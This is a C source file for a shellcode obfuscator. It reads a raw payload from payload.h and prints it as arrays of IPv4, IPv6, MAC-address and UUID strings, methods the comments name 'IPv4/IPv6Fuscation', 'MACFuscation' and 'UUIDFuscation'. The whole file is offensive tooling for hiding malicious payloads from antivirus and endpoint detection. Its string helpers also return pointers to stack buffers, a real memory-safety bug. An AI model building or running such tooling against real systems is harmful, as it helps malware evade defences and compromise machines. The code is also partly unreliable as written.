#include <stdio.h>
#include <windows.h>
#include "payload.h"
// 方法一 IPv4 __ IPv6Fuscation

// Function takes in 4 raw bytes and returns them in an IPv4 string format
char* GenerateIpv4(int a, int b, int c, int d) {
	unsigned char Output[32];

	// Creating the IPv4 address and saving it to the 'Output' variable 
	sprintf(Output, "%d.%d.%d.%d", a, b, c, d);

	// Optional: Print the 'Output' variable to the console
	// printf("[i] Output: %s\n", Output);

	return (char*)Output;
}


// Generate the IPv4 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

	// If the shellcode buffer is null or the size is not a multiple of 4, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 4 != 0) {
		return FALSE;
	}
	printf("char* Ipv4Array[%d] = { \n\t", (int)(ShellcodeSize / 4));

	// We will read one shellcode byte at a time, when the total is 4, begin generating the IPv4 address
	// The variable 'c' is used to store the number of bytes read. By default, starts at 4.
	int c = 4, counter = 0;
	char* IP = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {

		// Track the number of bytes read and when they reach 4 we enter this if statement to begin generating the IPv4 address
		if (c == 4) {
			counter++;

			// Generating the IPv4 address from 4 bytes which begin at i until [i + 3] 
			IP = GenerateIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);

			if (i == ShellcodeSize - 4) {
				// Printing the last IPv4 address
				printf("\"%s\"", IP);
				break;
			}
			else {
				// Printing the IPv4 address
				printf("\"%s\", ", IP);
			}

			c = 1;

			// Optional: To beautify the output on the console
			if (counter % 8 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}


// Function takes in 16 raw bytes and returns them in an IPv6 address string format
char* GenerateIpv6(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

	// Each IPv6 segment is 32 bytes
	char Output0[32], Output1[32], Output2[32], Output3[32];

	// There are 4 segments in an IPv6 (32 * 4 = 128)
	char result[128];

	// Generating output0 using the first 4 bytes
	sprintf(Output0, "%0.2X%0.2X:%0.2X%0.2X", a, b, c, d);

	// Generating output1 using the second 4 bytes
	sprintf(Output1, "%0.2X%0.2X:%0.2X%0.2X", e, f, g, h);

	// Generating output2 using the third 4 bytes
	sprintf(Output2, "%0.2X%0.2X:%0.2X%0.2X", i, j, k, l);

	// Generating output3 using the last 4 bytes
	sprintf(Output3, "%0.2X%0.2X:%0.2X%0.2X", m, n, o, p);

	// Combining Output0,1,2,3 to generate the IPv6 address
	sprintf(result, "%s:%s:%s:%s", Output0, Output1, Output2, Output3);

	// Optional: Print the 'result' variable to the console
	// printf("[i] result: %s\n", (char*)result);

	return (char*)result;
}


// Generate the IPv6 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateIpv6Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
	// If the shellcode buffer is null or the size is not a multiple of 16, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0) {
		return FALSE;
	}
	printf("char* Ipv6Array [%d] = { \n\t", (int)(ShellcodeSize / 16));

	// We will read one shellcode byte at a time, when the total is 16, begin generating the IPv6 address
	// The variable 'c' is used to store the number of bytes read. By default, starts at 16.
	int c = 16, counter = 0;
	char* IP = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {
		// Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the IPv6 address
		if (c == 16) {
			counter++;

			// Generating the IPv6 address from 16 bytes which begin at i until [i + 15]
			IP = GenerateIpv6(
				pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],
				pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],
				pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],
				pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]
			);
			if (i == ShellcodeSize - 16) {

				// Printing the last IPv6 address
				printf("\"%s\"", IP);
				break;
			}
			else {
				// Printing the IPv6 address
				printf("\"%s\", ", IP);
			}
			c = 1;

			// Optional: To beautify the output on the console
			if (counter % 3 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}


// 方法二 MACFuscation

// Function takes in 6 raw bytes and returns them in a MAC address string format
char* GenerateMAC(int a, int b, int c, int d, int e, int f) {
	char Output[64];

	// Creating the MAC address and saving it to the 'Output' variable 
	sprintf(Output, "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X", a, b, c, d, e, f);

	// Optional: Print the 'Output' variable to the console
	// printf("[i] Output: %s\n", Output);

	return (char*)Output;
}

// Generate the MAC output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateMacOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

	// If the shellcode buffer is null or the size is not a multiple of 6, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 6 != 0) {
		return FALSE;
	}
	printf("char* MacArray [%d] = {\n\t", (int)(ShellcodeSize / 6));

	// We will read one shellcode byte at a time, when the total is 6, begin generating the MAC address
	// The variable 'c' is used to store the number of bytes read. By default, starts at 6.
	int c = 6, counter = 0;
	char* Mac = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {

		// Track the number of bytes read and when they reach 6 we enter this if statement to begin generating the MAC address
		if (c == 6) {
			counter++;

			// Generating the MAC address from 6 bytes which begin at i until [i + 5] 
			Mac = GenerateMAC(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5]);

			if (i == ShellcodeSize - 6) {

				// Printing the last MAC address
				printf("\"%s\"", Mac);
				break;
			}
			else {
				// Printing the MAC address
				printf("\"%s\", ", Mac);
			}
			c = 1;

			// Optional: To beautify the output on the console
			if (counter % 6 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}


// 方法三 UUIDFuscation

// Function takes in 16 raw bytes and returns them in a UUID string format
char* GenerateUUid(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

	// Each UUID segment is 32 bytes
	char Output0[32], Output1[32], Output2[32], Output3[32];

	// There are 4 segments in a UUID (32 * 4 = 128)
	char result[128];

	// Generating output0 from the first 4 bytes
	sprintf(Output0, "%0.2X%0.2X%0.2X%0.2X", d, c, b, a);

	// Generating output1 from the second 4 bytes
	sprintf(Output1, "%0.2X%0.2X-%0.2X%0.2X", f, e, h, g);

	// Generating output2 from the third 4 bytes
	sprintf(Output2, "%0.2X%0.2X-%0.2X%0.2X", i, j, k, l);

	// Generating output3 from the last 4 bytes
	sprintf(Output3, "%0.2X%0.2X%0.2X%0.2X", m, n, o, p);

	// Combining Output0,1,2,3 to generate the UUID
	sprintf(result, "%s-%s-%s%s", Output0, Output1, Output2, Output3);

	//printf("[i] result: %s\n", (char*)result);
	return (char*)result;
}



// Generate the UUID output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateUuidOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
	// If the shellcode buffer is null or the size is not a multiple of 16, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0) {
		return FALSE;
	}
	printf("char* UuidArray[%d] = { \n\t", (int)(ShellcodeSize / 16));

	// We will read one shellcode byte at a time, when the total is 16, begin generating the UUID string
	// The variable 'c' is used to store the number of bytes read. By default, starts at 16.
	int c = 16, counter = 0;
	char* UUID = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {
		// Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the UUID string
		if (c == 16) {
			counter++;

			// Generating the UUID string from 16 bytes which begin at i until [i + 15]
			UUID = GenerateUUid(
				pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],
				pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],
				pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],
				pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]
			);
			if (i == ShellcodeSize - 16) {

				// Printing the last UUID string
				printf("\"%s\"", UUID);
				break;
			}
			else {
				// Printing the UUID string
				printf("\"%s\", ", UUID);
			}
			c = 1;
			// Optional: To beautify the output on the console
			if (counter % 3 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}


int main()
{
	GenerateIpv4Output(Data_RawData, sizeof(Data_RawData));

	GenerateIpv6Output(Data_RawData, sizeof(Data_RawData));

	GenerateMacOutput(Data_RawData, sizeof(Data_RawData));

	GenerateUuidOutput(Data_RawData, sizeof(Data_RawData));
}
